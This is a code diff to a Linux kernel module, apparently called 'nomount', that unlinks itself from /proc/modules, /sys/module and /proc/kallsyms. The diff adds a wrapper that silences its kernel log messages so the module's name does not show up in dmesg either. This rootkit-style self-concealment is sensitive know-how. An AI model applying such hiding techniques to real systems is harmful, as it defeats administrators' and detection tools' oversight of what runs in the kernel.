@@ -19,6 +19,7 @@
 #include <linux/mutex.h>
 #include <linux/rcupdate.h>
 #include <linux/kobject.h>
+#include <linux/printk.h>
 
 #include "nm_oot.h"
 #include "nm_hide.h"
@@ -30,6 +31,37 @@ MODULE_PARM_DESC(hide,
 	"once it is up (default 1). hide=0 keeps it listed and rmmod-able.");
 
 static bool nm_hidden;
+
+bool nm_hiding(void)
+{
+	return nm_hide;
+}
+
+/* nm_module_hide() unlinks the module so /proc/modules, /sys/module and
+ * /proc/kallsyms stop naming it - and then every guard that came up before it
+ * had already written "nomount: <arm> active" to the kernel ring buffer, which
+ * is the same name in a different place. dmesg_restrict keeps apps out of it, so
+ * this is a thin surface rather than an open one, but a module that hides from
+ * three readers and announces itself to a fourth is not hiding.
+ *
+ * So the routine lines are printed only when hide=0, which is the dev build that
+ * wants them. Warnings are untouched: they fire when an arm did NOT come up, and
+ * then the name in the log is the price of being able to diagnose it.
+ */
+void nm_say(const char *fmt, ...)
+{
+	struct va_format vaf;
+	va_list args;
+
+	if (nm_hide)
+		return;
+
+	va_start(args, fmt);
+	vaf.fmt = fmt;
+	vaf.va = &args;
+	printk(KERN_INFO "%pV", &vaf);
+	va_end(args);
+}
 
 void nm_module_hide(void)
 {
